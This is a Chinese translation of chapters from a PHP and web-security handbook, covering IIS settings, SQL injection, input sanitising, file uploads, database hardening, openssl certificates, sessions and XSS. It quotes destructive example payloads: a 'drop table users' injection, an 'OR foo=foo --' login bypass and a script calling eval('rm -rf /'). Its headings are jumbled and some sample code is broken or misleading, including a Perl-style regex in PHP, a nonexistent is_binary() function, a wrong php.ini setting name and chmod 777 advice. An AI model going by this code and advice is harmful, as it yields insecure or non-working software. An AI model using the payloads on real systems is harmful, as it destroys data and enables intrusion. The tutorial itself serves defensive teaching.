  \ `Home Directory`（主目录）选项卡，如图 3-8 所示。\n\n**图 3-8:**\n属性对话框的主目录选项卡。\n\n9. 从 `Application\
  \ Pool`（应用程序池）下拉列表中选择你刚刚创建的应用程序池，如图 3-9 所示，并点击 `OK`。\n现在应用程序池已与网站关联。\n\n**图 3-9:**\n\
  选择应用程序池。\n\n10. 点击 `Web sites` 文件夹，然后点击你正在操作的网站。\n\n如果你尚未 Web 根目录下创建此文件夹，则需要创建。\n\
  \n11. 右键点击网站并选择 `Properties`（属性）；在出现的属性框中，点击 `Home Directory`（主目录）选项卡，如图 3-10 所示。\n\
  \n**图 3-10:**\n属性对话框。\n\n12. 从 `Permissions`（权限）下拉列表中选择相应的级别，如图 3-11 所示。除非你有充分理由允许可执行文件，否则请将此级别设置为\
  \ `Read`（读取）。\n\n保护 IIS 的最后一步工作是按照以下步骤仅启用所需的扩展（如 ASP）：\n\n1. 选择 `开始` ➪ `管理工具` ➪\
  \ `Internet 信息服务管理器`。\n出现 `Internet 信息服务管理器` 窗口。\n\n2. 选择 `Service Extensions`（服务扩展）图标，如图\
  \ 3-12 所示。\n\n**图 3-12:**\n服务扩展屏幕。\n\n3. 选择你想要修改的扩展，然后根据需要点击 `Allow`（允许）或 `Prohibit`（禁止）按钮。\n\
  \n4. 右键点击 `Web Sites` 文件夹中的网站并选择 `Properties`（属性）；在出现的属性对话框中，选择 `Home Directory`（主目录）选项卡，如图\
  \ 3-13 所示。\n\n**图 3-13:**\n属性选项卡。\n\n5. 在 `Home Directory` 选项卡中，点击 `Configuration`（配置）按钮。确保谓词设置正确，如图\
  \ 3-14 所示。\n\n**图 3-14:**\n属性选项卡。\n\n6. 从 `Application Pool` 下拉列表中选择你刚刚创建的应用程序池，如图\
  \ 3-15 所示，并点击 `OK`。\n\n**图 3-15:**\n选择应用程序池。\n\n\n\n\n仅采用几项良好的编程实践就可以消除绝大多数应用程序安全漏洞。诚然，某些受过高教育、手段老练的人会致力于破解应用程序，但你的应用程序更有可能被那些无所事事的高中生攻破。为什么呢？因为\
  \ PHP Web 应用程序中几乎所有的安全漏洞都是基于于几个疏忽的编程实践——\n\n其中大多数失败都发生在错误处理、变量清洗和文件上传这“三大”领域。\n\n\
  在本章中，我们将涵盖这三大领域，并告诉您最佳方法来让您的 PHP 应用程序免受之害。\n\n## 安全地处理错误\n\n在理想的世界里，当你创建一个要求用户输入名字的表单时，你可以合理地预期他们会输入类似\
  \ John 或 Jane 这样的名字。遗憾的是，你也会遇到留空表单、输入地址或干脆输入随机字符字符串的用户。\n\n而这些是无害的用户。坏人则是为了不法目的向你的表单中输入内容。\n\
  \n### 理解危险性\n\n一种攻击被称为 `SQL injection`。在这种攻击中，坏人假设表单中收集的信息将用于 SQL 查询，并在你的数据库上执行。攻击者在你的表单字段中输入字符，这些字符在用于查询时会给你带来麻烦。\n\
  \n例如，攻击者可能会输入类似 `John; drop%20table%20users` 的内容。如果你的应用程序设置为将用户名存入数据库，你的 SQL 查询看起来像这样：\n\
  \n```sql\nINSERT INTO users VALUES (John; drop table users);\n```\n\n取决于你的服务器配置，服务器可能会读取该查询并愉快地从你的数据库中删除\
  \ `users` 表。它可能会对语法稍有抱怨，但如果你有宽松数据库配置，它将完全按照该行代码的指令执行：将“John”添加到 `users` 表，然后删除名为\
  \ `users` 的表。这可不好。\n\n请参阅本小书第 3 章以获取更多关于保护服务器的信息。幸运的是，一旦你意识到了这种攻击，就可以很容易地防止它。可以假设，在允许用户输入进入应用程序之前，你应该对每个用户输入实例进行测试，并在用户输入你未预期的内容时进行适当处理。大多数情况下，你只需简单拒绝不符合你预期的输入。\n\
  \n在另一个 SQL 注入的示例中，坏人在表单的用户名字段中输入字符，允许其在没有用户名或密码的情况下登录 Web 页面：假设用户在用户名字段中输入以下字符：\n\
  \n`John’ OR ‘foo’ = ‘foo’ --`\n\n你的脚本可能包含以下语句来测试用户名和密码：\n\n```php\n$sql = “SELECT\
  \ \\* FROM User WHERE userID = ‘$_POST[userID]’ AND password = ‘$_POST[password]’”;\n\
  ```\n\n如果你在不更改代码的情况下插入用户输入的代码，你将得到以下 SQL 查询：\n\n```php\n$sql = “SELECT \\* FROM\
  \ User WHERE username = ‘John’ OR ‘foo’ = ‘foo’ -- ‘ AND password = ‘$_POST[password]’”;\n\
  ```\n\n此查询允许用户在没有用户名或密码的情况下登录。在第一个子句中，`foo =` 使得后续查询变得有效。\n\n### 测试意外情况\n\n（注：原文后续为大量重复内容，已去重）\n\
  \n\n\n\n坏人明明必须从列表中进行选择，他们是如何向你发送恶意数据的呢？这并不难。坏人只需要在自己的浏览器中显示你的表单并将其保存到他的计算机上。然后他对其进行编辑，更改你的选择列表或单选按钮中的数据以符合他的目的。\n\
  \n在坏人在你的表单中添加了危险代码后，他在自己的浏览器中显示并提交。记住，表单的 `<form>` 标签中仍然有 `action` 参数，因此坏人知道表单提交时应该运行的\
  \ PHP 脚本名称。此外，坏人知道程序的 URL，因为他刚刚从那里获取了你的表单。所以，现在表单连同坏人的新代码被提交到了你的处理脚本中。\n\n你也可以使用正则表达式来检查列表变量。例如，以下正则表达式仅匹配指定的文本：`preg_match(\"\
  /male|female)/\")`\n\n# 变量清理\n\n有时候，当用户未能输入有效数据时，要求他们返回并重试并不是一个可行的方案。当你不得不使用用户提供的内容时，可以使用一些技术来确保恶意数据不会破坏你的应用程序——更糟糕，破坏支持你应用程序的底层系统，例如电子邮件传输和操作系统。接下来的章节将告诉该如何防止恶意用户输入破坏运行。\n\
  \n## 第四卷\n\n## 第四章\n\n###  HTML 特殊字符\n\n有时候，你想允许用户在你的应用程序中输入 HTML。例如，一个《安全的 PHP\
  \ 编程》博客评论系统通常允许用户发布超链接。\n\n但你不需要让你的应用程序接受用户可能想要放入的任何内容。\n\n如果你允许用户输入 HTML，你应该始终使用\
  \ `htmlentities()` 函数将 HTML 特殊字符转换为 HTML 实体。`htmlentities()` 函数将要转换的字符串作为其参数。\n\n\
  该函数随后会对比以下 HTML 特殊字符进行简单的查找和替换：\n\n- ✦ `&`（和符号）变为 `&amp;`\n- ✦ `\"`（双引号）变为 `&quot;`\n\
  - ✦ `'`（单引号）变为 `&#039;`\n- ✦ `<`（小于号）变为 `&lt;`\n- ✦ `>`（大于号）变为 `&gt;`\n\n如果你需要转义（escape）HTML\
  \ 中每个具有特殊含义的字符，请使用 `htmlentities()` 而不是 `htmlspecialchars()`。\n\n### 清理电子邮件地址\n\n\
  许多 Web 应用程序允许访问者将网站信息通过电子邮件发送他们的朋友。这项功能对于在线查找资料的用户来说非常方便，但你必须为这种便利付出代价。一旦你的应用程序开始发送电子邮件，它就会成为垃圾邮件发送者的目标，特别是如果你允许用户在发送的信息中包含个人备注时。\n\
  \n幸运的是，大多数垃圾邮件发送者不会坐在电脑前一个一个地向 Web 表单输入电子邮件地址。他们会输入整个列表，并用逗号或分号分隔（这是大多数底层电子邮件系统识别的分割符）。你的应用程序可能会这样处理表单输入：\n\
  \n```php\n$subj = \"Information about widgets from \" .\n$_POST[\"from_name\"];\n\
  \n$mesg = $_POST[\"personal_note\"] . \"We hope you find this information useful.\
  \ Please visit our Web site at www.example.com for more information.\";\n$to = $_POST[\"\
  to\"];\n\nmail($to, $subj, $mesg);\n```\n\n注意示例中倒数第二行。我们直接从 `$_POST` 数组中提取数据并用于应用程序，而没有进行任何形式的输入检查或清理。不幸的是，当你的邻居垃圾邮件发送者出现并在\
  \ `To` 字段输入 10,000 个逗号分隔的电子邮件地址时，`mail()` 函数会乐意地向所有 10,000 个地址发送垃圾邮件者关于在线处方药的消息。\n\
  \n### 在不损害文件系统的基础上上传文件\n\n你可以通过简单的变量清理来防止这个问题。按如下方式修改代码：\n\n```php\n$subj = \"Information\
  \ about widgets from \" .\n$_POST[\"from_name\"];\n\n$msg = $_POST[\"personal_note\"\
  ] . \"We hope you find this information useful. Please visit our Web site at www.example.com\
  \ for more information.\";\n$unsafe_to = $_POST['to'];\n$success = sanitize_and_send($subj,\
  \ $mesg, $unsafe_to);\n\nfunction sanitize_and_send($subj, $mesg, $unsafe_to) {\n\
  \    if($unsafe_to !~ ^.*(\\\\||,).*$) {\n        $to = $_POST[\"to\"];\n      \
  \  mail($to, $subj, $mesg);\n    }\n}\n```\n\n通过添加加粗所示的代码来检查从 `$_POST` 数组中获取的输入，你确保了如果有人想使用你的应用程序发送有关在线药物的垃圾邮件，他们至少必须得费一番功夫。这个代码示例对处理错误输入并没有太大作用，但至少没有允许不安全的输入到达\
  \ `mail()` 函数。\n\n大多数应用程序不需要上传文件。如果你不允许上传文件，这些应用程序会更安全。你可以通过你的 `php.ini` 文件中的 `file_uploads`\
  \ 设置来防止文件上传。该设置默认开启，如下：\n\n```ini\nfile_uploads = On\n```\n\n将该设置更改为 `Off` 以防止 PHP\
  \ 脚本中的任何文件上传。\n\n## 第四卷\n\n某些应用程序需要让用户上传文件。（第六卷第 1 章展示了一个允许用户上传文件的第 4 章脚本。）遗憾的是，这一需求也导致了产生严重安全问题的潜在风险。恶意用户可以：\n\
  \n- ✦ 发起拒绝服务 (DoS) 攻击\n- ✦ 覆盖现有文件\n- ✦ 在服务器上放置恶意代码以备后日之用\n\n由于 Web 应用程序的开放性，你无法完全保护应用程序内部的文件上传功能，但你可以减轻危险。\n\
  \n### 避免对文件系统的 DoS 攻击\n\n文件上传引发了 DoS 攻击的可能，因为恶意用户可以上传极大的文件，并在过程中耗尽文件系统中所有的可用资源。上传大文件可以通过阻止服务器写入临时文件或虚拟内存交换文件来有效地导致服务器崩溃。你可以在\
  \ `php.ini` 中限制文件大小，但这样做无法防止每秒尝试上传数百个 2MB 文件的脚本攻击。\n\n你确实应该在 `php.ini` 中对文件大小设置限制（请参考本迷你书第\
  \ 3 章获取更多关于 `php.ini` 的信息）。你还应该为上传的文件创建一个独立的专用系统。这个独立的系统可以将任何恶意行为与服务器的其他部分隔离开。上传文件系统可能会被垃圾文件填，导致应用程序的文件功能不可用——但至少整个服务器不会崩溃。\n\
  \n### 验证文件\n\n在文件上传后，你应该验证它是否是合法文件。\n\n虽然你可能无法过滤所有的恶意上传，但你可以减少那些最明显的攻击。以下是验证文件的一些方法：\n\
  \n- **验证文件名扩展名**。这种检查不是最稳健的测试（因为人们可以很容易地重命名扩展名），但它执行简单，并且可以捕捉一些试图通过你的图像上传函数上传 `spam_sender.php`\
  \ 等文件的低级破解者。\n- **测试你预期的基本文件类型**。例如，如果你期望的是图像，可以使用 `is_binary()` 函数来过滤掉文本文件（如 PHP\
  \ 脚本），如下所示：\n```php\n$input = $_POST['input_file'];\n\nif (is_binary($input)) {\n\
  \    // 正常继续\n}else {\n    // 拒绝文件、重定向浏览器等\n}\n```\n- **使用杀毒软件（如 F-Prot，可用于 www.f-prot.com）对文件进行扫描**。\n\
  \n\n\n\n\n# 在不损害文件系统的情况下上传文件\n\n## 使用 FTP 函数确保安全文件上传\n\nWeb 应用程序出于各种原因允许用户上传文件是相当常见的。某些留言板允许用户上传较小的图片或头像，这些图片将显示在用户的每个帖子旁边。其他应用程序则允许你上传数据文件进行分析。你可以使用\
  \ PHP 内置的 `fopen()` 函数，它会自动打开一个指向文件或 URL 的流，允许用户上传文件。遗憾的是，这种方法极易被恶意用户利用，他们可以利用它从远程服务器上传文件到你的\
  \ Web 服务器上。\n\n防止此类利用攻击需要你在 `php.ini` 中禁用两个设置：`register_globals` 和 `url_fopen`。禁用这些设置可以防止用户在你不明确显式启用该功能的情况下使用\
  \ PHP 内置的文件上传功能。（请参阅本微型书籍的第 3 章获取有关 `php.ini` 的更多信息。）\n\n在 `php.ini` 中禁用这两个函数后，你仍然需要允许用户上传文件。请使用\
  \ PHP 的 FTP 函数集（这是一种比 `fopen()` 安全得多的的方法）允许用户上传文件。PHP FTP 函数的详细用法将在第二本书第 3 章中介绍。\n\
  \n你可以非常直观地使用 FTP 函数。首先，你建立连接，然后上传你需要的文件，最后关闭连接。列表 4-1 显示了如何在 PHP 中使用 FTP 函数：**列表\
  \ 4-1：使用基础 FTP 函数**\n\n```php\n<?php\n// 建立基础连接\n$connection_id = ftp_connect($ftp_server);\n\
  \n// 使用用户名和密码登录\n$login_result = ftp_login($connection_id, $ftp_username, $ftp_password);\n\
  \n// 检查连接\nif ((!$connection_id) || (!$login_result)) {\n    echo “FTP 连接失败！”;\n\
  \    echo “尝试为用户 $ftp_username 连接 $ftp_server\";\n    exit;\n} else {\n    echo\
  \ “已连接到 $ftp_server，用户为 $ftp_username”;\n}\n\n// 上传文件\n$upload = ftp_put($connection_id,\
  \ $destination_file, $source_file, FTP_BINARY);\n\n// 检查上传状态\nif (!$upload) {\n\
  \    echo “FTP 上传失败！”;\n} else {\n    echo “已将 $source_file 上传到 $ftp_server 并命名为\
  \ $destination_file”;\n}\n\n// 关闭 FTP 流\nftp_close($conn_id);\n?>\n```\n\n以下是最通的\
  \ FTP 函数及其参数：\n\n✦ `ftp_connect( string $host [, int $port [, int $timeout ] )`:\
  \ 连接到 FTP 服务器 —— 在此情况下，即你的 Web 服务器。\n✦ `ftp_login( resource $ftp_stream, string\
  \ $username, string $password )`: 向 FTP 服务器发送登录凭据。\n✦ `ftp_put( resource $ftp_stream,\
  \ string $remote_file, string $local_file, int $mode [, int $startpos ] )`: 将文件从本地机器上传到服务器。\n\
  ✦ `ftp_get( resource $ftp_stream, string $local_file, string $remote_file, int $mode\
  \ [, int $resumepos ] )`: 从服务器获取文件并发送到本地机器。\n✦ `ftp_close( resource $ftp_stream\
  \ ):`: 关闭与服务器的连接。\n\n一旦完成操作，你就需要关闭 FTP 流；否则，你将拥有一个易受劫持的开放连接。\n\n## 保护箱安全\n\n为文件上传创建一个独立的文件系统，以便最大限度地减少你的服务器遭受拒绝服务（DoS）攻击的风险。（更多信息请参阅本章前面的“避免针对文件系统的\
  \ DoS 攻击”部分。）然而，将文件上传到独立的文件系统并不能消除保护该文件系统的需求。将文件隔离可以防止攻击者击垮整个服务器，但不能阻止他们对你的应用程序进行\
  \ DoS 攻击。如果你的临时文件系统充满了垃圾文件，应用程序将无法允许上传。\n\n为了保持应用程序运行顺，请遵循以下步骤：\n\n1. **在上传文件系统中创建一个权限为\
  \ 700 的临时目录（所有者拥有读、写、执行权限，其他人无权限）。** 确保该目录的所有者与运行应用程序的用户相同。\n2. **在上传之前，使用 `chmod()`\
  \ 函数通过程序将权限更改为 777（所有用户均拥有读、写、执行权限），如下所示:**\n   ```php\n   chmod(\"/temp/tempfile.gif\"\
  , 777);\n   ```\n3. **使用 FTP 函数上传文件。** 参阅本章前面的“使用 FTP 函数确保安全文件上传”部分。\n4. **上传后立即将权限改回\
  \ 700，以缩短攻击机会窗口。**\n5. **验证文件。**\n6. **将文件移动或复制到最终位置。**\n\n考虑这种情况：用户上传文件并尝试通过你的应用程序访问它。通常情况下，这种过程是可以接受的。问题出现在恶意用户实际上上传了一个名为\
  \ `php.ini` 的文件时。你的应用程序可能会显示这些敏感文件，更糟糕的是暴露它们。\n\n你可以通过一种简单的方法防止此类文件损坏：为任何上传的文件分配新文件名，并存储原始文件名（如果需要）。\n\
  \n例如，假设你的应用程序允许用户上传图片。你可以根据用户名分配临时文件名，例如 `jsmith001.gif`、`jsmith002.gif` 等。使用 PHP\
  \ 内置的 `rename()` 函数将文件移动到永久位置，如下：\n\n```php\nrename(\"/tempfiles/jsmith_image.gif\"\
  , \"/my_application/images/jsmith_image.gif\");\n```\n\n始终避免使用 shell 命令，无论是通过 `eval()`\
  \ 还是引号（`` ` ``）函数。PHP 内置函数通常是比这种方法更安全的替代方案：\n\n```php\neval(\"mv /tempfiles/jsmith_image.gif\
  \ /my_application/images/jsmith_image.gif\");\n```\n\n如果你的应用程序只是显示用户的图片，你根本不需要存储原始文件名\
  \ —— 用户只关心他们的图片是否显示，而不关心它在文件系统中的名称。相反，如果你的用户期望查看他们的图片列表，你就需要为了显示目的存储原始文件名。你不需要真的将文件重命名为原始文件名；只需将其存储在查找表中，并与文件系统中的文件名交叉引用。\n\
  \n这种混淆手段无法阻止坚定的攻击者，但它可以为你的文件上传增加一层安全保护。\n\n\n\n\n\n# 防止跨站脚本攻击\n# 保持你的技术栈更新\n\n电子商务应用程序要求你比其他类型的应用程序更深入地考虑安全性。如果你不经意在博客应用程序中留下了安全漏洞，最坏的情况是你的服务器变成垃圾邮件发送者的乐场。这并不愉快，但也不是世界末日。然而，如果你的电子商务应用程序遭到破译，你就将客户暴露在信用卡欺诈和身份盗窃的风险之中。当你进入电子商务世界时，你面对的是一个全新级别的安全挑战。\n\
  \n本章涵盖了你在编写电子商务应用程序之前需要理解的基础安全概念。\n\n## 保护你的数据库\n\n每个电子商务应用程序的核心都是数据库。这颗核心是黑客最具吸引力的奖品，因为你在这个数据库中存储了所有客户的信息——可能甚至是他们的支付信息。\n\
  \n避免存储客户的信用卡号或卡安全码（卡背面的那三个数字）。许多大型商家都这样做，并且几家已经面临了信用卡信息被盗的问题——更不用说公关噩梦了。除非你有足够的资源来充分保护你的服务器和网络，否则请完全避免这个问题，并在交易完成后立即删除信用卡信息。\n\
  \n你需要遵循两个步骤来保护电子商务数据库：保护数据库本身以及保护访问数据库所需的信息。\n\n### 保护数据库\n\n根据你的企业规模，你的数据库可能与你的\
  \ Web 服务器位于同一台物理机器上，也可能位于独立的服务器上。无论何种，请密切关注以下几个关键信息：\n\n✦ 运行数据库的用户\n✦ 连接到数据库时使用的密码\n\
  ✦ 每个用户被授予的权限\n\n### 选择数据库用户\n\n你可能认为，创建一个通用的系统用户来运行 Web 服务器、邮件服务器和数据库，或者让这些系统以 `root`\
  \ 或管理员用户的身份运行是有意义的——这样，你就知道服务器应用程序拥有操作所需的任何权限。\n\n然而，**任何程序都不应该**以 `root`（或 Windows\
  \ 上的 `Administrator`）身份运行。如果你的服务器以 `root` 用户身份运行，恶意用户只需攻破一个 Web 服务器，即可完全控制该机器上的所有内容。到那时，你只能从物理上拔掉机器电源，因为当你意识到它已被入侵时，黑客已经更改了\
  \ `root` 密码并将你锁在外面。\n\n这个警告如此重要，以至于我们要重复一遍：永远不要以 `root` 身份运行 Web 服务器、数据库服务器或邮件服务器等服务。\n\
  \n你不应该让所有服务都以同一个用户运行，这和你不想以 `root` 运行所有内容的原因相同：当一切都以同一个用户运行时，如果一个服务被攻破，它们都会暴露风险。\n\
  \n为了将黑客可能造成的伤害降至最低，数据库服务器应该以自己的用户身份在它自己的组中运行。例如，许多 `MySQL` 服务器以用户 `mysql` 的身份在组\
  \ `mysql` 中运行。你称呼该用户和组并不重要，重要的是该用户与服务器上发生的其他操作隔离开来。就像服务器上的任何其他用户一样，运行数据库的用户也应该有一个强密码。本小书的第\
  \ 2 章提供了关于如何选择安全密码的更多信息。\n\n### 权限要吝啬\n\n上一节涵盖了以自己的用户身份运行数据库。在这一节中，我们稍微转换一下，讨论真正的数据库用户——即在数据库内部创建、具有管理数据库以及访问或修改数据权限的用户。\n\
  \n你需要一个负责数据库整体维护的`administrator user`。这个用户——仅此此用户——需要完全权限。同时，为你的电子商务应用程序创建一个权限受限的用户。根据你的应用程序，该用户可能需要在\
  \ `Order` 表上有 `INSERT`、`UPDATE` 和 `SELECT` 权限，但在 `Product` 表上只有 `SELECT` 权限。\n\n\
  作为一个一般原则，尽可能授予尽可能少的权限以允许每个用户执行其操作。在分配 `GRANT` 权限时要格外小心，因为该权限允许用户将其权限授予其他用户。\n\n\
  ### 存储连接字符串和密码\n\n在设置好数据库和用户之后，你需要一种让应用程序连接到数据库的方法。在 PHP 中，你通过以下方式建立连接：\n\n```\n\
  mysql_connect($server, $username, $password, $new_flags);\n```\n\n遗憾的是，该系统以明文形式存储服务器信息、用户名和密码。你无法做什么来规避这一点，但你可以——也应该——将这段代码与应用程序的其他部分隔离开。\n\
  \n### 分别存储连接字符串\n\n为了隔离你的连接字符串，请将其存储在一个名为 `db_connections.inc` 或在你的应用程序中合理的独立文件中。仅在需要设置数据库连接时才包含此文件。这种方法对于保护连接字符串中存储的信息作用不大，但它确实将该信息与应用程序的其他部分隔离开来。你可以通过将该隔离文件移动到\
  \ Web 服务器的文档根之外来增加保护，使使用户无法窥探你的网站时无法访问。你还可以通过文件系统限制访问，使其仅对运行你应用程序的用户可用。\n\n### 加密所有存储的密码\n\
  \n很有可能，如果你正在开发一个电子商务应用程序，你就会创建用户账户并在数据库中存储密码。即使你采取了所有预防措施来保护数据库本身，你仍然应该使用单向加密对密码进行加密。（本小书的第\
  \ 2 章可以为你提供关于加密的更多细节。）\n\n`MySQL` 具有几种内置加密方案：\n\n✦ `AES_ENCRYPT()` 和 `AES_DECRYPT()`：这些函数使用高级加密标准\
  \ (AES) 算法进行加密。默认情况下，AES 使用 128 位加密。\n\n✦ `ENCODE()` 和 `DECODE()`：使用操作系统的随机数生成器生成二进制字符串。这些函数对于短字符串效果，但对于密码来说通常不够强大。它们取决于操作系统的随机数生成器。\n\
  \n✦ `DES_ENCRYPT()` 和 `DES_DECRYPT()`：使用三重数据加密标准算法进行加密。\n\n✦ `ENCRYPT()` 和 `DECRYPT()`：这些函数调用底层的\
  \ `crypt()` 系统函数。\n\n✦ `MD5()`：为字符串计算 MD5（消息摘要算法 5）校验和。MD5 的攻击漏洞已知，这使得该方法在加密敏感数据时不是理想的方案。\n\
  \n✦ `SHA1()`：为字符串计算 SHA1（安全哈希算法）校验和。SHA1 的攻击漏洞也是为人知的。\n\n\n\n\n安全套接层，或 `SSL`，是用于在公共网络发送加密信息的行业标准技术。它是多种技术的结合，这些技术共同工作确保信息在传输过程中没有被截获或篡改。\n\
  \n***\n\n# 使用安全套接层发送加密数据\n\n## 获取数字证书\n\n正如本微型书籍第 2 章所述，数字证书充当服务器签名，确保用户连接到的是他们所认为的服务器，并确保服务器背后的机构至少是合法的。\n\
  \n数字证书并不意味着一个机构实际上是 `legitimate` 的——即它正在从事正常、合法或符合伦理的活动。数字证书只能向用户保证证书颁发机构（或 `CA`）已经查看了有效的身份证明文件并确认了证书持有者的身份。\n\
  \n获取数字证书你有两个选择：\n\n- 从证书颁发机构购买商业证书。\n- 创建并签名你自己的证书。\n\n从商业 `CA` 购买证书无疑是获取数字证书最简单的方法，但也是最贵的。`Verisign`\
  \ 和 `Thawte` 是两个最著名的 `CAs`，但你也可以找到许多更便宜的选择。你为这些知名商业 `CA` 付出的费用一部分是为了其品牌知名度和一系列额外服务，例如证书管理、自动续签以及一个放置在你网站上的小图标，用来向你的用户保证你拥有由他们认识并信任的公司签名的数字证书。\n\
  \n你也可以通过创建和签名你自己的证书来成为自己的 `Certificate Authority`。为了建立用户的信任，你需要你的 `CA` 由一个更高级的 `CA`\
  \ 支持。为了获得这种支持，你从知名的 `CA` 购买一个商业证书，然后在你自己创建的证书中引用该证书。证书链是较小的 `CAs` 证明其合法性的非常常见的方法。较小的\
  \ `CA` 发发证书，用户信任该证书是因为这个较小的 `CA` 可以指向一个信任它的较大的 `CA`。\n\n假设你运行了几个子域名：\n\n- `www.example.com`\n\
  - `http://catalog.example.com`\n- `http://support.example.com`\n- `http://extranet.example.com`\n\
  \n为每个子域名购买单独证书可能很贵，但如果你尝试为所有四个子域名提供单个证书，用户将看到类似图 5-1 所示的警告信息，提示请求的域名与证书上的域名不匹配。为了解决这个问题，你可以购买一个单一商业证书，然后为其他子域名生成你自己的证书，并将它们链到你从知名\
  \ `CA` 购买的证书上。\n\n![Image 56](img/index-443_1.jpg)\n\n**图 5-1：** 用于多个子名的单一证书的错误信息。\n\
  \n***\n\n## 创建数字证书\n\n为了演示如何创建数字证书，我们使用 `OpenSSL Library` 的 `openssl` 工具（可从 `www.openssl.org`\
  \ 获取）。只需遵循以下步骤：\n\n1. 在命令提示符处输入以下命令为自己的证书颁发机构生成私钥：\n```\nopenssl genrsa -des3 -out\
  \ ca.key 1024\n```\n\n2. 输入以下命令根据你在第 1 步创建的密钥创建 CA 证书。此命令提示你输入证书中区别名称（Distinguished\
  \ Name）部分的信息：\n```\nopenssl req -new -x509 -days 365 -key ca.key -out ca.cert\n\
  ```\n\n3. 使用以下命令为服务器生成新的私钥：\n```\nopenssl genrsa -des3 -out server.key 1024\n```\n\
  \n4. 输入以下命令创建证书签名请求（CSR）。此命令提示你输入关于服务器的各种信息，包括通用名称（Common Name），即 SSL 服务器的完全限定域名：\n\
  ```\nopenssl req -new -key server.key -out server.csr\n```\n\n5. 将 CSR 发送到证书颁发机构进行签名。你使用以下语句将\
  \ CSR 发送到你自己的 CA：\n```\nopenssl x509 -CA ca.crt -CAkey ca.key -in server.csr -req\
  \ -out server.crt -set_serial `date +%s` -days 365\n```\n\n6. 使用以下命令验证证书上的签名和细节：\n\
  ```\nopenssl verify -CAfile ca.crt server.crt\nopenssl x509 -in server.crt -text\n\
  ```\n\n确保 `server.key` 和 `ca.key` 文件仅对 root 用户可读。只有 `.crt` 文件应该是全局可读的，通过设置文件权限允许所有用户读取权限。\n\
  \n***\n\n## 使用 Apache 的 mod_SSL\n\n在创建或购买数字证书后，你必须设置服务器以将其交付给浏览器。Apache 2.0 在源码中预编译了\
  \ `mod_ssl`，但你仍然需要对 `ssl.conf` 文件进行一些调整，以确保设置符合你的应用程序。你可以在网上找到关于 modssl 的最新文档。\n\
  \n### 保持会话安全\n\n会话技术是现代 Web 应用在 HTTP 这种无状态的世界跟踪状态的方法。会话数据存储在 `$_SESSION` 数组中。当用户向\
  \ Web 服务器发送请求时，他们包含了会话 ID，这允许应用程序检索并使用他们的会话数据。会话的工作原理在第六册第 2 章详细解释。\n\n除非用户禁用了 cookie，否则会话\
  \ ID 通过 cookie 从浏览器传递到 Web 服务器。如果禁用了 cookie，可以通过 URL 或 POST 表单传递会话 ID。\n\n### 使用\
  \ cookie\n\n通常，cookie 存储用户硬盘上的微文件。会话 cookie 仅保留在内存中，因此如果用户关闭浏览器，会话将失效。如果用户并非有意关闭浏览器，他们需要重新登录，但为了防止会话劫持或固定，这是一个很微小的代价。\n\
  \n在不使用 HTML 表单的情况下，通过 URI 传递会话 ID 是为禁用 cookie 的用户提供会话的唯一方法，但这也要危险得多，因为会话 ID 是明文传递的，被称为使用透明会话\
  \ ID。网络嗅探者可以轻而易举地获取会话 ID。更大的风险是合法用户可以复制 URI 并将其发送（通常通过不安全的电子邮件或即时通讯工具）给另一个人，其他人随后可以恢复第一个用户的会话。\n\
  \n除非你有充分的理由去照顾不接受 cookie 的用户，否则请始终在 cookie 中存储会话信息。通过在 `php.ini` 文件中放置以下行可以将这些信息存储在\
  \ cookie 中：\n```\nini_set('session.use_only_cookies', TRUE);\nini_set('session.use_trans_sid',\
  \ FALSE);\n```\n\n如果你有一个敏感的应用程序，你应该使用 SSL。通过 SSL，你的浏览器/服务器之间的通信是加密的，无论如何传递，都没有人嗅探到你的会话\
  \ ID。\n\n### 设置会话超时\n\n\n\n\n\n会话可以设置为在一段时间后超时或失效。这是一个好主意，因为这样如果用户离开了你的应用程序，当恶意用户路过并尝试使用你的应用程序时（伪装成那个离开的合法用户），应用程序将自动使会话失效，从而有效地将用户从系统上注销。\n\
  \n将会话超时变量设置为适用于你应用程序的合理时间。（你也可以在 `php.ini` 中全局设置此值。）会话超时可以防止旧的会话仅仅因为用户忘记关闭浏览器窗口而持续存在。多长时间才合理？这取决于你的应用程序。如果你正在编写一个在线银行应用程序，你可能想将此数字设置为几分钟内。如果你在开发\
  \ ESPN 的幻幻橄榄球应用程序，几个小时可能就足够安全了。\n\n会话超时变量的值取决于你的应用程序。如果你有一系列供用户填写的短表单，或者你的应用程序显示的信息特别敏感，你可能想设置一个相当短的超时时间——例如，五分钟。另一方面，如果你预计用户会进行多任务处理，在你的应用程序和其他某些活动之间切换，或者信息并不是那么关键，那么你可能想设置一个更长的超时时间——例如几个小时——以免给用户带来不便。\n\
  \n## 防止跨站脚本攻击\n\n### 重新生成会话 ID\n\n每当用户更改状态时（通常是通过登录或注销你应用程序的安全区域），你都应该使用 `session_regenerate_id()`\
  \ 函数为他们重新生成会话 ID。\n\n重新生成用户的会话 ID 可以防止恶意用户在用户处于低安全区域时劫持该 ID，然后使用该 ID 访问应用程序的高安全区域。例如，当用户访问\
  \ `www.example.com` 网站时，系统会为其发放一个随机会话 ID 以跟踪其用户界面偏好。当该用户登录网站的安全区域时，如果该不安全的会话 ID\
  \ 被劫持了，劫持者就可以跟随用户进入安全区域——除非你使初始会话失效并将其替换为安全的会话 ID。同样地，如果你在用户离开你应用程序的安全区域后没有让该安全的会话失效，劫持者就可以发现该用户的会话\
  \ ID 并使用它访问安全区域，因为该会话已经通过了身份验证。\n\n下面的代码演示了如何重新生成会话 ID：\n\n```php\n<?php\nif( !empty($_POST['passwd'])\
  \ && $_POST['passwd'] == $passwd) {\n    session_regenerate_id();\n    //在此处进行任何清理工作，例如设置\n\
  \    $_SESSION['authenticated'] 变量或重定向到应用程序的安全区域。\n}\n```\n\n此方法不会破坏 `$_SESSION`\
  \ 超全局变量中的任何数据。它只是替换了会话 ID。\n\n### 跨站脚本 (XSS)\n\n*跨站脚本*（或简称 XSS）是安全领域中的一个热门词汇，似乎每隔几天就会发现一个新的\
  \ XSS 漏洞..。在本节中，我们将揭开这些炒作，并准确解释 XSS 攻击是如何运作的，以及如何防止它们。\n\n#### XSS 攻击是如何工作的\n\n\
  跨站脚本模型有很多变体，但本质上，它涉及恶意用户在表单输入区域输入脚本。当这些数据被应用程序使用时，脚本就会运行并发生坏事。例如，`http://blog.example.com`\
  \ 允许匿名访问者发表评论。Joe BadGuy 访问了网站并在评论表单中输入了以下代码：\n\n```html\n<script language = \"\
  PHP\">\neval('rm -rf /');\n</script>\n```\n\n当下次加载网站时，以 Web 服务器身份运行的用户将删除操作系统允许其删除的所有内容。只需三行小代码，你的应用程序就消失了。希望你做过备份！\n\
